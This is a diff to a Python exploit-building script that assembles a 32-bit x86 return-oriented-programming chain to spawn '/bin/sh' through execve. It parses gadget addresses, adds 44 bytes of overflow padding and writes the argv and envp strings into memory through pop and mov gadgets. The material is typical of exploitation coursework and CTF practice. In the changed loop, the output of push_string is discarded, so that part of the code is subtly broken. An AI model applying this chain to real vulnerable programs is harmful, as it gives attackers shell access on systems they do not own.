@@ -8,12 +8,12 @@ from struct import pack
 
 
 parser = argparse.ArgumentParser(
-    description = "",
-    formatter_class = argparse.ArgumentDefaultsHelpFormatter,
+    description="",
+    formatter_class=argparse.ArgumentDefaultsHelpFormatter,
 )
-parser.add_argument("--command", default = "/bin/sh")
-parser.add_argument("--envp", default = None)
-parser.add_argument("--out-rop-path", default = None)
+parser.add_argument("--command", default="/bin/sh")
+parser.add_argument("--envp", default="")
+parser.add_argument("--out-rop-path", default=None)
 
 
 def main(args):
@@ -22,9 +22,12 @@ def main(args):
 
     gadgets, data_address = parse_out_rop(Path(args.out_rop_path))
 
-    rop_chain, stack_ptr, argv_ptr = push_array_of_strings(argv, gadgets, data_address)
-    envp_chain, stack_ptr, envp_ptr = push_array_of_strings(envp, gadgets, stack_ptr)
-    rop_chain += envp_chain
+    # Add padding
+    rop_chain = b'A'*44
+
+    # Push argv and envp
+    rop_chain, stack_ptr, argv_ptr = push_array_of_strings(argv, gadgets, data_address, rop_chain)
+    rop_chain, stack_ptr, envp_ptr = push_array_of_strings(envp, gadgets, stack_ptr, rop_chain)
 
     rop_chain += pack('<I', gadgets[": pop ecx ; pop ebx ; ret"])
     rop_chain += pack('<I', argv_ptr)  # Put argv in ecx
@@ -75,8 +78,7 @@ def parse_out_rop(path: Path):
     return rop_gadgets, data_address
 
 
-def push_array_of_strings(array, gadgets, data_address):
-    rop_chain = b''
+def push_array_of_strings(array, gadgets, data_address, rop_chain):
     stack_pointer = data_address
     pointers = []
 
@@ -90,7 +92,7 @@ def push_array_of_strings(array, gadgets, data_address):
 
         # Push chunks onto the stack.
         for chunk in chunks:
-            push_item(gadgets, stack_pointer, chunk.encode('utf-8'))
+            push_string(gadgets, stack_pointer, chunk.encode('utf-8'))
             stack_pointer += 4
         # Terminate strings with null.
         rop_chain += push_null(gadgets, stack_pointer)
@@ -106,6 +108,16 @@ def push_array_of_strings(array, gadgets, data_address):
     stack_pointer += 4
 
     return rop_chain, stack_pointer, array_pointer
+
+
+def push_string(gadgets, stack_pointer, string):
+    rop_chain = b''
+    rop_chain += pack('<I', gadgets[": pop edx ; ret"])
+    rop_chain += pack('<I', stack_pointer)
+    rop_chain += pack('<I', gadgets[": pop eax ; ret"])
+    rop_chain += string
+    rop_chain += pack('<I', gadgets[": mov dword ptr [edx], eax ; ret"])
+    return rop_chain
 
 
 def push_item(gadgets, stack_pointer, item):
